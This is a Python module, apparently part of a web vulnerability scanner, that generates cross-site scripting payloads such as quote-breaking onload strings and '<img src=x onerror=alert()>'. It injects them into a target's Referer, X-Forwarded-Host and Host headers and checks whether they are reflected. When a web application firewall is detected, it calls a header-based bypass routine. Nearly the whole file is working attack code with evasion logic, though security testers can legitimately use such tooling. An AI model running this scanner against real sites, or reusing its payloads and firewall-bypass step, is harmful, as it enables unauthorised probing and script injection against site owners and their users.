from pprint import pprint
from attacks.bypasses import xff, waf
import requests

quotes = ['\'', '"', '`']
dom_action = 'onload='
xss_action = 'alert(1)'
tag_payload = '<img src=x onerror=alert()>'
closing_tags = ['/>', '-->', '*/']
channel_list = ['Referer', 'X-Forwarded-Host', 'Host']


def build_payload_list():
    result = []
    for quot in quotes:
        # 'onload='alert(1)
        result.append(quot + dom_action + quot + xss_action)
        # onload='alert(1)'
        result.append(dom_action + quot + xss_action + quot)
        # <img src=x onerror=alert()>
        result.append(tag_payload)
        # /><img src=x onerror=alert()>
        for close in closing_tags:
            result.append(close + tag_payload)
    return result


def optimize_payload_list(response, payload_list):
    """
    reduce network cycles
    :type payload_list: list
    """
    if response.text.find('&quot') > -1:
        for payload in payload_list:
            if payload.find('\'') > -1:
                payload_list.remove(payload)
    if response.text.find('&lt') > -1:
        for payload in payload_list:
            if payload.find('<') > -1:
                payload_list.remove(payload)
    if response.text.find('&gt') > -1:
        for payload in payload_list:
            if payload.find('>') > -1:
                payload_list.remove(payload)
    return payload_list


def check(url, simple=True):
    """
    Payload found in response
    :param url:
    :return:
    """
    if simple:
        payload_list = ['\'onload=alert();', '<img src=x onerror=alert()>']
    else:
        payload_list = build_payload_list()
    try:
        if payload_list:
            for xss_payload in payload_list:
                for channel in channel_list:
                    response = requests.get(url, headers={
                        channel: xss_payload
                    })
                    payload_list = optimize_payload_list(response, payload_list)
                    if not waf.detect_waf(response.text):
                        if response.text.find(xss_payload) > -1:
                            pprint('XSS ' + channel + ' : ' + xss_payload)
                            return True
                    else:
                        bypassed_response = xff.xff(response, response.request.method)
                        if bypassed_response:
                            if bypassed_response.text.find(xss_payload) > -1 and not waf.detect_waf(bypassed_response.text):
                                pprint('BYPASS is detected')
                                pprint('XSS ' + channel + ' : ' + xss_payload)
                                return True
        return False
    except Exception as ex:
        pprint(ex)
    return False
